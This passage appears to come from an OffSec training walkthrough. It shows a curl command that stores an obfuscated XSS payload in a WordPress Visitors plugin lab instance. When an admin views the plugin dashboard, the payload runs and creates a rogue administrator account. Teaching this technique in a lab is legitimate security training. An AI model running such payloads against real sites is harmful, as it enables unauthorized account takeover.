curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

We are proxying through burp.

Everything seems correct, so let's forward the request by clicking Forward, then disabling Intercept.

At this point, our XSS exploit should have been stored in the WordPress database. We only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left.

We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into `<script>` tags, so the browser cannot render any string from it.

By loading the plugin statistics, we should have executed the malicious script, so let's verify if our attack succeeded by clicking on the Users menu on the left pane.

